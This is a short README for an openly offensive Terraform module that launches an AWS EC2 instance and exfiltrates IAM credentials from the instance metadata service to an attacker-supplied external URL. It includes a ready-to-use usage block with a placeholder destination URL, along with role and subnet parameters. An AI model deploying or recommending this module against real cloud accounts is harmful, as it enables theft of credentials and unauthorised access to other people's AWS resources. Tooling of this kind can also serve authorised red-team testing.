# AWS EC2 Instance Credential Exfiltration Module

![OffensiveTerraform](https://img.shields.io/badge/offensive-terraform-purple)

Offensive Terraform module which creates EC2 instance and exfilrate credential from Instance metadata to external URL.

![Attack Diagram](https://github.com/offensive-terraform/terraform-aws-ec2-instance-credential-exfiltration/blob/master/diagram.jpg)

## Usage
```
module "ec2_instance_credential_exfiltration" {
    source = "offensive-terraform/terraform-aws-ec2-instance-credential-exfiltration"

    subnet_id = "subnet-0a4a1cc04"
    url = "http://0.0.0.0/
    iam_role= "ec2-instance-role"
    iam_instance_profile = "ec2-instance-profile"
}
```
## Author
Module managed by https://github.com/offensive-terraform/

